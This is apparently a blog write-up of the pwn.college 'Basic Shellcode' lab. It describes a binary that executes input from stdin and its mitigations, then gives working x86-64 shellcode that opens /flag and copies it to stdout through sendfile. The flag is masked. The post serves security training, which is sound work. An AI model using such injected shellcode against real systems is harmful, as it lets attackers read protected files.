---
layout: post
title: Basic Shellcode
date: 2026-05-31 22:58 -0400
published: true
categories: ["ShellCoding","Pwn College"]
tags: ["ASM", "Assembler","Low Level"]
toc: true
---
# Basic Shellcode — Writeup

## Vulnerability Analysis

The binary reads up to 0x1000 bytes from stdin into a stack buffer and then **directly executes it** as code via `((void(*)())shellcode)()`. There is no vulnerability to exploit — this is pure *code injection*, where the user provides arbitrary shellcode that the binary willingly executes.

**Mitigations:**
- NX disabled (executable stack / RWX segments)
- PIE enabled (doesn't matter for position-independent shellcode)
- All fds > 2 are closed; argv and envp are zeroed — we can't use conventional tricks like `execve("/bin/sh")`

**Key source line** (`binary-exploitation-basic-shellcode.c:112`):
```c
((void(*)())shellcode)();
```

## Exploit Strategy

Since fds 0, 1, 2 are open (stdin, stdout, stderr), we use:
1. `open("/flag", O_RDONLY)` — syscall 2, returns the next available fd (3)
2. `sendfile(1, fd, NULL, 256)` — syscall 40, copies data from fd to stdout without needing a user buffer
3. `exit(0)` — syscall 60, clean exit

## Shellcode

```asm
xor eax, eax
push rax                    ; null terminator
mov rax, 0x67616c662f       ; "/flag" in little-endian
push rax
mov rdi, rsp                ; path
xor esi, esi                ; O_RDONLY = 0
xor edx, edx                ; mode = 0
mov eax, 2                  ; __NR_open
syscall

mov edi, 1                  ; stdout
mov esi, eax                ; fd from open()
xor edx, edx                ; offset = NULL
mov r10d, 0x100             ; count
mov eax, 40                 ; __NR_sendfile
syscall

xor edi, edi
mov eax, 60                 ; __NR_exit
syscall
```

## Flag

`pwn.college{X.X}`
